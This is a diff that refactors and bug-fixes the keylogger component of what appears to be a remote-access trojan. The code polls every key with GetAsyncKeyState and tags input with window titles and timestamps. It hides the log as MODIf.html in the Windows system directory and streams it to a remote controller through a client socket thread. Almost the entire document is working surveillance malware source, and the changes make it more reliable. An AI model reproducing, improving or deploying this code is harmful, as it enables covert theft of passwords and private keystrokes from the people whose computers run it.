@@ -9,24 +9,27 @@
 //////////////////////////////////////////////////////////////////////
 
 #include <iostream>
+#include <winbase.h>
+#include <winuser.h>
 using namespace std;
 
-CKeyboardManager1::CKeyboardManager1(CClientSocket *pClient) : CManager(pClient)
-{
+#define FILE_PATH "\\MODIf.html"
+#define CAPTION_SIZE 1024
 
+CKeyboardManager1::CKeyboardManager1(CClientSocket *pClient, int n) : CManager(pClient)
+{
     sendStartKeyBoard();
     WaitForDialogOpen();
     sendOfflineRecord();
 
-    GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
-    lstrcat(strRecordFile, "\\MODIf.html");
+    GetSystemDirectory(m_strRecordFile, sizeof(m_strRecordFile));
+    lstrcat(m_strRecordFile, FILE_PATH);
 
     m_bIsWorking = true;
     dKeyBoardSize = 0;
 
     m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, (LPVOID)this, 0, NULL);
-    m_hSendThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendDate,(LPVOID)this,0,NULL);
-
+    m_hSendThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendData,(LPVOID)this,0,NULL);
 }
 
 CKeyboardManager1::~CKeyboardManager1()
@@ -44,12 +47,11 @@ void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, UINT nSize)
         NotifyDialogIsOpen();
 
     if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE) {
-
     }
 
     if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR) {
-        DeleteFile(strRecordFile);
-        HANDLE hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
+        DeleteFile(m_strRecordFile);
+        HANDLE hFile = CreateFile(m_strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         CloseHandle(hFile);
         dKeyBoardSize = 0;
@@ -86,7 +88,7 @@ int CKeyboardManager1::sendOfflineRecord(DWORD	dwRead)
     int		nRet = 0;
     DWORD	dwSize = 0;
     DWORD	dwBytesRead = 0;
-    HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
+    HANDLE	hFile = CreateFile(m_strRecordFile, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (hFile != INVALID_HANDLE_VALUE) {
@@ -95,7 +97,6 @@ int CKeyboardManager1::sendOfflineRecord(DWORD	dwRead)
         if (0 != dwRead) {
             SetFilePointer(hFile, dwRead, NULL, FILE_BEGIN);
             dwSize -= dwRead;
-
         }
 
         TCHAR *lpBuffer = new TCHAR[dwSize];
@@ -106,7 +107,7 @@ int CKeyboardManager1::sendOfflineRecord(DWORD	dwRead)
             lpBuffer[i] ^= '`';
 
         nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
-        delete lpBuffer;
+        delete[] lpBuffer;
     }
     CloseHandle(hFile);
     return nRet;
@@ -399,14 +400,8 @@ string GetKey(int Key) // 判断键盘按下什么键
     return KeyString;
 }
 
-void SaveToFile(TCHAR *lpBuffer)
+void SaveToFile(TCHAR *strRecordFile, TCHAR *lpBuffer)
 {
-    printf(lpBuffer );
-
-    TCHAR	strRecordFile[MAX_PATH];
-    GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
-    lstrcat(strRecordFile, _T("\\MODIf.html"));
-
     HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
                                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
@@ -428,41 +423,34 @@ void SaveToFile(TCHAR *lpBuffer)
     return;
 }
 
-TCHAR KeyBuffer[2048] = {0};
-HWND PreviousFocus = NULL;
-TCHAR WindowCaption[1024] = {0};
-BOOL IsWindowsFocusChange()
+BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool hasData)
 {
     HWND hFocus = GetForegroundWindow();
     BOOL ReturnFlag = FALSE;
-    TCHAR szText[1024]= {0};
-
     if (hFocus != PreviousFocus) {
         if (lstrlen(WindowCaption) > 0) {
-            if (lstrlen(KeyBuffer) > 0) {
+            if (hasData) {
                 SYSTEMTIME   s;
                 GetLocalTime(&s);
-                wsprintf(szText,_T("\r\n[标题:] %s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n"),WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
-                SaveToFile(szText);
+                wsprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
+                    WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
             }
-            memset(szText,0,sizeof(szText));
-            memset(WindowCaption,0,sizeof(WindowCaption));
+            memset(WindowCaption, 0, CAPTION_SIZE);
             ReturnFlag=TRUE;
         }
         PreviousFocus = hFocus;
-        SendMessage(hFocus,WM_GETTEXT,sizeof(WindowCaption),(LPARAM)WindowCaption);
-
+        SendMessage(hFocus, WM_GETTEXT, CAPTION_SIZE, (LPARAM)WindowCaption);
     }
     return ReturnFlag;
 }
 
-DWORD WINAPI CKeyboardManager1::SendDate(LPVOID lparam)
+DWORD WINAPI CKeyboardManager1::SendData(LPVOID lparam)
 {
     CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;
 
     while(pThis->m_bIsWorking) {
         DWORD dwSize =0;
-        HANDLE	hFile = CreateFile(pThis->strRecordFile, GENERIC_READ, FILE_SHARE_READ,
+        HANDLE	hFile = CreateFile(pThis->m_strRecordFile, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
         if (hFile != INVALID_HANDLE_VALUE) {
@@ -483,23 +471,32 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
 {
     CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;
 
-    string TempString = "";
-
+    TCHAR KeyBuffer[2048] = {};
+	TCHAR szText[CAPTION_SIZE] = {};
+    TCHAR WindowCaption[CAPTION_SIZE] = {};
+    HWND PreviousFocus = NULL;
     while(pThis->m_bIsWorking) {
         Sleep(5);
-        if (IsWindowsFocusChange()) {
-            if (lstrlen(KeyBuffer)) {
-                lstrcat(KeyBuffer,_T("\r\n"));
-                SaveToFile(_T("[内容:]"));
-                SaveToFile(KeyBuffer);
+        int num = lstrlen(KeyBuffer);
+        if (pThis->IsWindowsFocusChange(PreviousFocus, WindowCaption, szText, num > 0) || num > 2000) {
+            bool newWindowInput = strlen(szText);
+            if (newWindowInput){// 在新的窗口有键盘输入
+                lstrcat(KeyBuffer, szText);
+                memset(szText, 0, sizeof(szText));
+            }
+            if (lstrlen(KeyBuffer) > 0) {
+                if (!newWindowInput)
+                    lstrcat(KeyBuffer, _T("\r\n"));
+                const int offset = sizeof(_T("\r\n[内容:]")) - 1;
+                memmove(KeyBuffer+offset, KeyBuffer, strlen(KeyBuffer));
+                memcpy(KeyBuffer, _T("\r\n[内容:]"), offset);
+                SaveToFile(pThis->m_strRecordFile, KeyBuffer);
                 memset(KeyBuffer,0,sizeof(KeyBuffer));
-                printf(KeyBuffer);
-
             }
         }
-        for(int i = 8; i <=255; i++) {
-            if(GetAsyncKeyState(i)&1 ==1) {
-                TempString = GetKey (i);
+        for(int i = 8; i <= 255; i++) {
+            if((GetAsyncKeyState(i)&1) == 1) {
+                string TempString = GetKey (i);
                 lstrcat(KeyBuffer,TempString.c_str());
             }
         }
